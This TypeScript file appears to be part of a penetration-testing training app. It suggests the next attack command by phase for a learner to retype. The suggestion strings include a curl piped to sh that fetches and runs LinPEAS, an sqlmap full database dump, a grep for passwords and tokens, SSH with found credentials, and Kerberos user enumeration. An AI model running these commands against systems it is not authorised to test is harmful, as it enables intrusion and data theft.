/**
 * GHOST COMMAND SYSTEM (MUSCLE MEMORY BUILDER)
 * 
 * Displays next logical command as grey ghost text
 * User types over it manually
 * Reinforces correct command chaining and PT1 methodology
 */

export type PentestPhase = 'reconnaissance' | 'scanning' | 'enumeration' | 'initial_access' | 'privilege_escalation' | 'post_exploitation';

export interface CommandContext {
  phase: PentestPhase;
  lastCommand: string;
  lastOutput: string;
  discoveredInfo: {
    openPorts?: string[];
    services?: string[];
    directories?: string[];
    credentials?: string[];
    flags?: string[];
  };
  targetIP: string;
}

export interface GhostSuggestion {
  command: string;
  explanation: string;
  reasoning: string;
  priority: 'critical' | 'high' | 'medium' | 'low';
}

/**
 * Reconnaissance phase suggestions
 */
function getReconSuggestions(context: CommandContext): GhostSuggestion[] {
  const suggestions: GhostSuggestion[] = [];
  
  // Initial nmap scan if nothing discovered yet
  if (!context.discoveredInfo.openPorts || context.discoveredInfo.openPorts.length === 0) {
    suggestions.push({
      command: `nmap -sC -sV -Pn -T4 -p- ${context.targetIP} -oA nmap/full`,
      explanation: 'Comprehensive port scan with service detection',
      reasoning: 'Start with full port enumeration to identify attack surface',
      priority: 'critical',
    });
  }
  
  // If ports discovered, suggest service-specific enumeration
  if (context.discoveredInfo.openPorts && context.discoveredInfo.openPorts.length > 0) {
    suggestions.push({
      command: `nmap -sV -sC -p${context.discoveredInfo.openPorts.join(',')} ${context.targetIP}`,
      explanation: 'Deep service enumeration on discovered ports',
      reasoning: 'Get detailed version info and run default scripts',
      priority: 'high',
    });
  }
  
  return suggestions;
}

/**
 * Web enumeration phase suggestions
 */
function getWebEnumSuggestions(context: CommandContext): GhostSuggestion[] {
  const suggestions: GhostSuggestion[] = [];
  
  const hasWebService = context.discoveredInfo.services?.some(s => 
    s.toLowerCase().includes('http') || s.toLowerCase().includes('web')
  );
  
  if (hasWebService) {
    // Content discovery
    if (!context.lastCommand.includes('ffuf') && !context.lastCommand.includes('gobuster')) {
      suggestions.push({
        command: `ffuf -u http://${context.targetIP}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,204,301,302,307,401,403`,
        explanation: 'Fast web directory fuzzing with ffuf',
        reasoning: 'Discover hidden endpoints and admin panels',
        priority: 'critical',
      });
      
      suggestions.push({
        command: `gobuster dir -u http://${context.targetIP} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 50`,
        explanation: 'Alternative: gobuster directory enumeration',
        reasoning: 'Different tool, same goal - find hidden paths',
        priority: 'high',
      });
    }
    
    // Technology detection
    if (!context.lastCommand.includes('whatweb')) {
      suggestions.push({
        command: `whatweb -a 3 http://${context.targetIP}`,
        explanation: 'Identify web technologies and versions',
        reasoning: 'Understand stack to find framework-specific vulnerabilities',
        priority: 'medium',
      });
    }
    
    // Vulnerability scanning
    if (!context.lastCommand.includes('nikto')) {
      suggestions.push({
        command: `nikto -h http://${context.targetIP} -C all`,
        explanation: 'Web vulnerability scanner',
        reasoning: 'Automated detection of common web vulnerabilities',
        priority: 'medium',
      });
    }
  }
  
  return suggestions;
}

/**
 * Content analysis suggestions
 */
function getContentAnalysisSuggestions(context: CommandContext): GhostSuggestion[] {
  const suggestions: GhostSuggestion[] = [];
  
  // If directories discovered, suggest content download
  if (context.discoveredInfo.directories && context.discoveredInfo.directories.length > 0) {
    const dir = context.discoveredInfo.directories[0];
    suggestions.push({
      command: `wget -r -np -nH --cut-dirs=1 http://${context.targetIP}${dir}`,
      explanation: 'Download directory contents recursively',
      reasoning: 'Analyze files offline for credentials, configs, or vulnerabilities',
      priority: 'high',
    });
    
    suggestions.push({
      command: `curl http://${context.targetIP}${dir} | grep -iE "pass|key|token|secret|api"`,
      explanation: 'Search for sensitive strings in directory',
      reasoning: 'Quick grep for credentials and API keys',
      priority: 'high',
    });
  }
  
  return suggestions;
}

/**
 * Exploitation phase suggestions
 */
function getExploitationSuggestions(context: CommandContext): GhostSuggestion[] {
  const suggestions: GhostSuggestion[] = [];
  
  // SQLi detection
  if (context.lastOutput.includes('SQL') || context.lastOutput.includes('database')) {
    suggestions.push({
      command: `sqlmap -u "http://${context.targetIP}/page.php?id=1" --batch --dump`,
      explanation: 'Automated SQL injection exploitation',
      reasoning: 'Extract database contents if SQLi exists',
      priority: 'critical',
    });
  }
  
  // If credentials found, test SSH
  if (context.discoveredInfo.credentials && context.discoveredInfo.credentials.length > 0) {
    const [username, password] = context.discoveredInfo.credentials[0].split(':');
    if (username && password) {
      suggestions.push({
        command: `ssh ${username}@${context.targetIP}`,
        explanation: 'Test discovered credentials on SSH',
        reasoning: 'Credential reuse is common - try on all services',
        priority: 'critical',
      });
    }
  }
  
  return suggestions;
}

/**
 * Credential attack suggestions
 */
function getCredentialAttackSuggestions(context: CommandContext): GhostSuggestion[] {
  const suggestions: GhostSuggestion[] = [];
  
  const hasSSH = context.discoveredInfo.services?.some(s => s.toLowerCase().includes('ssh'));
  
  if (hasSSH && context.lastCommand.includes('hydra')) {
    // Suggest Kerberos brute force if domain detected
    suggestions.push({
      command: `kerbrute userenum -d corp.local users.txt --dc ${context.targetIP}`,
      explanation: 'Kerberos username enumeration',
      reasoning: 'Identify valid domain accounts for AS-REP roasting',
      priority: 'high',
    });
  }
  
  return suggestions;
}

/**
 * Post-exploitation suggestions
 */
function getPostExploitSuggestions(context: CommandContext): GhostSuggestion[] {
  const suggestions: GhostSuggestion[] = [];
  
  // Privilege escalation enumeration
  if (context.phase === 'privilege_escalation') {
    suggestions.push({
      command: `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`,
      explanation: 'LinPEAS privilege escalation enumeration',
      reasoning: 'Automated detection of Linux privesc vectors',
      priority: 'critical',
    });
    
    suggestions.push({
      command: `find / -perm -4000 -type f 2>/dev/null`,
      explanation: 'Find SUID binaries',
      reasoning: 'SUID binaries often lead to privilege escalation',
      priority: 'high',
    });
    
    suggestions.push({
      command: `sudo -l`,
      explanation: 'Check sudo permissions',
      reasoning: 'Identify commands that can be run as root',
      priority: 'high',
    });
  }
  
  return suggestions;
}

/**
 * Main suggestion engine - returns next logical command
 */
export function getGhostCommandSuggestion(context: CommandContext): GhostSuggestion | null {
  let suggestions: GhostSuggestion[] = [];
  
  switch (context.phase) {
    case 'reconnaissance':
    case 'scanning':
      suggestions = getReconSuggestions(context);
      break;
    case 'enumeration':
      suggestions = [
        ...getWebEnumSuggestions(context),
        ...getContentAnalysisSuggestions(context),
      ];
      break;
    case 'initial_access':
      suggestions = [
        ...getExploitationSuggestions(context),
        ...getCredentialAttackSuggestions(context),
      ];
      break;
    case 'privilege_escalation':
    case 'post_exploitation':
      suggestions = getPostExploitSuggestions(context);
      break;
  }
  
  // Filter out commands that were recently used (avoid repetition)
  const recentCommands = context.lastCommand.toLowerCase();
  suggestions = suggestions.filter(s => {
    const cmdBase = s.command.split(' ')[0];
    return !recentCommands.includes(cmdBase);
  });
  
  // Return highest priority suggestion
  if (suggestions.length === 0) return null;
  
  suggestions.sort((a, b) => {
    const priorityOrder = { critical: 0, high: 1, medium: 2, low: 3 };
    return priorityOrder[a.priority] - priorityOrder[b.priority];
  });
  
  return suggestions[0];
}

/**
 * Get alternative suggestions (for hint system)
 */
export function getAlternativeCommands(context: CommandContext): GhostSuggestion[] {
  const primary = getGhostCommandSuggestion(context);
  if (!primary) return [];
  
  // Get all suggestions and return top 3 alternatives
  let allSuggestions: GhostSuggestion[] = [];
  
  switch (context.phase) {
    case 'reconnaissance':
      allSuggestions = getReconSuggestions(context);
      break;
    case 'enumeration':
      allSuggestions = [
        ...getWebEnumSuggestions(context),
        ...getContentAnalysisSuggestions(context),
      ];
      break;
    case 'initial_access':
      allSuggestions = [
        ...getExploitationSuggestions(context),
        ...getCredentialAttackSuggestions(context),
      ];
      break;
    case 'privilege_escalation':
      allSuggestions = getPostExploitSuggestions(context);
      break;
  }
  
  return allSuggestions.filter(s => s.command !== primary.command).slice(0, 3);
}
